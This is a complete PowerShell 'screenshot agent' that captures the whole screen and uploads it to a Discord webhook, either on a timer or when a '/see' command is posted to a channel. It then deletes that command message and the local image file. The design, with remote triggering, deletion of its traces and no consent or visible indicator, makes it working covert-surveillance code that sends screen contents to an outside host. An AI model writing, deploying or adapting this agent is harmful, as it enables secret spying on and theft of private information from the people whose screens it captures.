# screen.ps1 — discord screenshot agent
# secrets live in the local config, not in this file:
#   $env:ProgramData\screenagent.cfg.ps1

$CfgPath = Join-Path $env:ProgramData 'screenagent.cfg.ps1'
$LogPath = Join-Path $env:TEMP 'screenagent.log'

function Log([string]$Message) {
    '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message |
        Add-Content -Path $LogPath -ErrorAction SilentlyContinue
}

if (-not (Test-Path $CfgPath)) {
    Log "config missing: $CfgPath"
    exit 1
}

try { . $CfgPath } catch { Log "config unreadable: $($_.Exception.Message)"; exit 1 }
if (-not $Config -or -not $Config.WebhookUrl) { Log 'config empty or no WebhookUrl'; exit 1 }
if (-not $Config.PollSec)     { $Config.PollSec = 3 }
if (-not $Config.IntervalSec) { $Config.IntervalSec = 300 }

Log "agent start bot=$([bool]$Config.BotToken) channel=$($Config.ChannelId)"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Capture-Screen {
    $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    try {
        $g.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bmp.Size)
        $path = Join-Path $env:TEMP ("screen_{0}.png" -f [DateTime]::Now.ToString('yyyyMMdd_HHmmss_fff'))
        $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        return $path
    }
    finally { $g.Dispose(); $bmp.Dispose() }
}

function Send-Screenshot {
    $file = $null
    try {
        $file = Capture-Screen
        $client = New-Object System.Net.Http.HttpClient
        try {
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $stream = [System.IO.File]::OpenRead($file)
            try {
                $form.Add((New-Object System.Net.Http.StreamContent $stream), 'file', (Split-Path $file -Leaf))
                $form.Add((New-Object System.Net.Http.StringContent 'screen capture'), 'content')
                $resp = $client.PostAsync($Config.WebhookUrl, $form).Result
                if ($resp.IsSuccessStatusCode) { Log 'screenshot sent' }
                else {
                    Log "webhook failed: $([int]$resp.StatusCode)"
                    if ($resp.StatusCode -eq [System.Net.HttpStatusCode]::TooManyRequests) { Start-Sleep -Seconds 10 }
                }
            }
            finally { $stream.Dispose(); $form.Dispose() }
        }
        finally { $client.Dispose() }
    }
    catch { Log "send error: $($_.Exception.Message)" }
    finally { if ($file -and (Test-Path $file)) { Remove-Item $file -Force -ErrorAction SilentlyContinue } }
}

function Bot-Head { @{ Authorization = "Bot $($Config.BotToken)" } }

function Start-BotLoop {
    $lastSeen = $null
    while ($true) {
        try {
            $uri = "https://discord.com/api/v10/channels/$($Config.ChannelId)/messages?limit=1"
            $msgs = Invoke-RestMethod -Uri $uri -Headers (Bot-Head) -ErrorAction Stop
            $m = @($msgs) | Select-Object -First 1
            if ($m -and $m.id -ne $lastSeen -and -not $m.author.bot -and $m.content -and ($m.content -match '^\s*/see\s*$')) {
                $lastSeen = $m.id
                Log "trigger /see from $($m.author.username)"
                Send-Screenshot
                try {
                    Invoke-RestMethod -Method Delete `
                        -Uri "https://discord.com/api/v10/channels/$($Config.ChannelId)/messages/$($m.id)" `
                        -Headers (Bot-Head) -ErrorAction Stop | Out-Null
                }
                catch { Log "delete failed: $($_.Exception.Message)" }
            }
        }
        catch { Log "poll error: $($_.Exception.Message)" }
        Start-Sleep -Seconds $Config.PollSec
    }
}

function Start-IntervalLoop {
    while ($true) {
        Send-Screenshot
        Start-Sleep -Seconds $Config.IntervalSec
    }
}

if ($Config.BotToken -and $Config.ChannelId) { Start-BotLoop } else { Start-IntervalLoop }
